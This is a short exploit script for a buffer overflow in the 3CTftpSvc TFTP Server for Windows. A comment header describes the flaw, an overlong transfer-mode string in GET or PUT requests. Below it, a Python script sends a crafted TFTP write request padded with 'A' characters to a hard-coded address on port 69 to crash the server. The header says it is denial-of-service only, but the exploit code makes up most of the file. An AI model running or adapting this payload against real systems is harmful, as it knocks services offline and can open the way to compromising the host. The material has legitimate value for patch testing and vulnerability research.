# Buffer Overflow (Long transporting mode) Vulnerability Exploit
# This is just a DoS exploiting code
# Tested on Windows xp SP2
#
# Requires python and impacket
#
# Coded by Liu Qixu Of NCNIPC

# SUMMARY:

# 3CTftpSvc TFTP Server is a Freeware TFTP server for Windows 9x/NT/XP.
# (http://support.3com.com/software/utilities_for_windows_32_bit.htm
# or ftp://ftp.3com.com/pub/utilbin/win32/3CTftpSvc.zip)
# It provides an implementation of the TFTPv2 protocol.

# A vulnerability has been identified in 3CTftpSvc TFTP Server, which could be exploited by attackers 
# to execute arbitrary commands or cause a denial of service. This flaw is 
# due to a buffer overflow error when handling an overly long transporting 
# mode (more than 470 bytes) passed to a &quot;GET&quot; or &quot;PUT&quot; command, which could 
# be exploited by malicious users to compromise a vulnerable system or crash 
# an affected application.

# EXPLOIT:

import socket
import sys

host = '192.168.1.11'
port = 69

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
   print &quot;socket() failed&quot;
   sys.exit(1)

filename = &quot;A&quot;
mode = &quot;netascii&quot; + &quot;A&quot; * 469
da = &quot;\x00\x02&quot; + filename + &quot;\0&quot; + mode + &quot;\0&quot;
s.sendto(da, (host, port))
